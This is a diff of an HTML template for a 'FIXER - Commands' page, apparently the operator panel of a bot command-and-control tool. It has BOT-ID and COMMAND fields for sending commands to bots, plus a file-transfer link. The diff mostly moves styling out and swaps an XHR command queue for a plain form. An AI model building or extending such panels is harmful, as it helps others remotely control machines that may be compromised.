@@ -4,136 +4,9 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <link rel="shortcut icon" href="../static/Lion.png" type="image/png">
     <title>FIXER - Commands</title>
-    <style>
-        .sidebar {
-            height: 100%;
-            width: 220px;
-            position: fixed;
-            top: 0;
-            left: 0;
-            background-color: #4caf50;
-            overflow-x: hidden;
-            padding-top: 10px;
-            text-align: left;
-        }
-        .sidebar a {
-            padding: 3px;
-            text-decoration: none;
-            font-size: 22px;
-            color: white;
-            display: flex;
-            align-items: center;
-            vertical-align: middle;
-        }
-        .sidebar img.avatar {
-            width: 25px;
-            margin-left: 10px;
-            align-items: center;
-            margin-bottom: 10px;
-            margin-right: 15px;
-            vertical-align: middle;
-        }
-        .sidebar img.logo {
-            margin-left: 10px;
-            width: 200px;
-            margin-bottom: 10px;
-        }
-        .sidebar h1 {
-            font-family: 'Impact', sans-serif;
-            font-weight: 500;
-            border: 1px solid white;
-            border-width: 2px;
-            border-radius: 10px;
-            padding: 5px;
-            font-size: 2em;
-            margin-left: 1px;
-            font-weight: 300;
-            line-height: 1em;
-            text-align: center;
-            color: #ba0000;
-        }
-        .sidebar a.selected {
-            background-color: #3a893e;
-        }
-        .sidebar a.logout {
-            background-color: #317334;
-        }
-        .sidebar a:hover {
-            background-color: #409744;
-        }
-        .content {
-            margin-left: 240px;
-            padding: 5px;
-            padding-top: 10px;
-            margin-top: 5px;
-        }
-        img {
-            display: block;
-        }
-        body {
-            font-family: 'Impact', sans-serif;
-            font-weight: 300;
-            line-height: 1.42em;
-            color: #A7A1AE;
-            background-color: #1F2739;
-        }
-        h1 {
-            font-size: 3em;
-            font-weight: 300;
-            line-height: 1em;
-            text-align: center;
-            color: #4DC3FA;
-        }
-        .sendcommands {
-            display: flex;
-            font-family: 'Impact', sans-serif;
-            font-size: 20px;
-            margin-left: 240px;
-            margin-top: 10px;
-            margin-right: 5px;
-            flex-direction: row;
-            align-items: center;
-            justify-content: center;
-        }
-        .sendcommands label {
-            margin-top: 5px;
-            margin-bottom: 5px;
-            font-size: 28px;
-            color: #ffffff;
-        }
-        .sendcommands input[type="text"] {
-            width: 400px;
-            padding: 8px;
-            margin: 0 5px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
-        }
-        .sendcommands button {
-            padding: 10px 10px;
-            background-color: #4caf50;
-            color: white;
-            border: none;
-            width: 220px;
-            height: 40px;
-            font-size: 16px;
-            border-radius: 7px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-            margin: 0 5px;
-        }
-        .sendcommands button:hover {
-            background-color: #45a049;
-        }
-        #output {
-            margin-top: 20px;
-            margin-left: 240px;
-            font-size: 16px;
-            color: #fff;
-            font-family: Arial, sans-serif;
-        }
-    </style>
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
 </head>
 <body>
     <div class="sidebar">
@@ -147,59 +20,20 @@
         <a href="{{ url_for('file_transfer') }}"><img src="{{ url_for('static', filename='file_transfer_icon.png') }}" alt="File Transfer Icon" class="avatar"> File Transfer</a>
         <a href="{{ url_for('logout') }}" class="logout"><img src="{{ url_for('static', filename='logout_icon.png') }}" alt="Logout Icon" class="avatar"> Logout</a>
     </div>
-    <form id="commandForm" class="sendcommands" onsubmit="sendCommand(); return false;">
-        <label for="idNumber">BOT ID:</label>
-        <input type="text" id="idNumber" name="idNumber" placeholder="Enter BOT-ID" required>
-        <label for="command">COMMAND:</label>
-        <input type="text" id="command" name="command" placeholder="Enter Command" required>
-        <button type="submit">SEND COMMAND</button>
-    </form>
+    <div class="form">
+        <form id="form" name="form" method="get">
+            <label for="idNumber">BOT-ID:</label>
+            <input type="text" id="idNumber" name="idNumber" placeholder="Enter BOT-ID" required>
+            <label for="command">COMMAND:</label>
+            <input type="text" id="command" name="command" placeholder="Enter Command" required>
+            <button type="submit" id="submit">SEND COMMAND</button>
+        </form>
+    </div>
     <div id="output">
-        <pre id="outputText">{{ commands_output }}</pre>
+        <pre id="outputText">{{output}}</pre>
     </div>
     <script>
-        var commandQueue = [];
-        var requestInProgress = false;
-        function sendCommand() {
-            var idNumber = document.getElementById('idNumber').value;
-            var command = document.getElementById('command').value;
-            commandQueue.push({ idNumber: idNumber, command: command });
-            if (!requestInProgress) {
-                sendNextCommand();
-            }
-        }
-        function sendNextCommand() {
-            if (commandQueue.length > 0) {
-                var nextCommand = commandQueue.shift();
-                var idNumber = nextCommand.idNumber;
-                var command = nextCommand.command;
-                var button = document.getElementById('sendButton');
-                button.disabled = true;
-                button.innerHTML = 'SENDING COMMAND';
-                var xhr = new XMLHttpRequest();
-                var url = '/commands?idNumber=' + encodeURIComponent(idNumber) + '&command=' + encodeURIComponent(command);
-                xhr.open('GET', url, true);
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState === XMLHttpRequest.DONE) {
-                        button.disabled = false;
-                        button.innerHTML = 'SEND COMMAND';
-                        if (xhr.status === 200) {
-                            var response = JSON.parse(xhr.responseText);
-                            var outputTextElement = document.getElementById('outputText');
-                            outputTextElement.textContent += response.message + '\n';
-                        } else {
-                            alert('ERROR : ' + xhr.responseText);
-                        }
-                        sendNextCommand();
-                    }
-                };
-                xhr.send();
-                requestInProgress = true;
-            } else {
-                requestInProgress = false;
-            }
-        }
-        setInterval(function () {   window.location.reload();   }, 20000);
+        setInterval(function () { window.location.href = window.location.origin + window.location.pathname; }, 30000);
     </script>
 </body>
 </html>
